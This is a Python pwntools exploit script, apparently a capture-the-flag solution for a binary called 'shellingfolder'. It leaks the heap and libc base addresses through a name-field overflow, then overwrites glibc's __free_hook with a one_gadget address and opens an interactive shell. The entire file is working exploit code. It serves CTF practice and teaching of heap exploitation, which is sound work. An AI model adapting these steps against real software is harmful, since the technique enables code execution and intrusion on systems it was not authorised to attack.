#!/usr/bin/env python
from pwn import *

def show():
    s.sendlineafter('choice:', '1')

def change(name):
    s.sendlineafter('choice:', '2')
    s.sendlineafter('Folder :', name)

def make(name):
    s.sendlineafter('choice:', '3')
    s.sendafter('Folder:', name)

def create(name, size):
    s.sendlineafter('choice:', '4')
    s.sendafter('File:', name)
    s.sendafter('File:', str(size))

def remove(name):
    s.sendlineafter('choice:', '5')
    s.sendlineafter('file :', name)

def calc():
    s.sendlineafter('choice:', '6')

s = process('./shellingfolder', env = {'LD_PRELOAD': './libc.so.6'})

elf = ELF('./shellingfolder')
libc = ELF('./libc.so.6')

create('A' * 0x18, 0)
calc()
s.recvuntil('A' * 0x18)
heap_base = u64(s.recvuntil(' : ')[:-3].ljust(8, '\0')) - 0x88
log.info('heap base: %#x' % heap_base)

create('A' * 0x18 + p64(heap_base + 0x18)[:-1], -0xe8)
remove('A' * 0x18)
calc()
show()
s.recvline()
libc_base = u64(s.recvline(False).ljust(8, '\0')) - 0x3c3b78
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadget = libc_base + one_gadgets[1]
make('A')
change('A')
create('A' * 0x18 + p64(libc_base + libc.symbols['__free_hook'])[:-1], u32(p64(one_gadget)[:4]))
create('A' * 0x18 + p64(libc_base + libc.symbols['__free_hook'] + 4)[:-1], u32(p64(one_gadget)[4:]))
calc()

create('A', 0)
remove('A')
s.interactive()
